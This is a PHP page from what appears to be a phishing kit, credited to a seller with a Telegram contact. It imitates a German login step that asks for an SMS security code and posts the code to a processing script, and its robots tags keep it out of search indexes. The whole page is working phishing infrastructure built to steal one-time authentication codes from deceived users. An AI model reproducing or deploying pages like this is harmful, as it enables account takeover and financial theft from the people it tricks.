<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "sms";
    reset_action(get_client_ip());

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Anmeldung</title>
    </head>

    <body>

        <div id="wrapper">
            <div class="container">
                <p class="text-end pt30 pb30" style="color: #1e325f; font-weight: 500; font-size: 16px; opacity: .65;">deutsch</p>
                <div class="box">
                    <div class="box-header">
                        <h3>Anmeldung</h3>
                    </div>
                    <div class="box-body">

                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="sms">

                        <p><b>Ein Sicherheitscode wird Ihnen per SMS oder Anruf von einem Sprachserver auf Ihrem Telefon zugesandt, der 5 Minuten gültig ist.</b></p>

                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="error">
                            <p>Ungültiger Code</p>
                        </div>
                        <?php endif; ?>

                        <div class="form-group row mb30">
                            <label class="col-md-5" for="sms_code">SMS-Code</label>
                            <div class="col-md-7">
                                <input type="text" name="sms_code" id="sms_code" class="form-control" autocomplete="off">
                            </div>
                        </div>
                        <div class="btns">
                            <button class="btttn" id="booom">Weiter</button>
                        </div>
                    </div>
                </div>
                <div class="footer-logo text-center pt50 pb50">
                    <img src="../media/imgs/footer-logo.png">
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'sms_code' : $('#sms_code').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>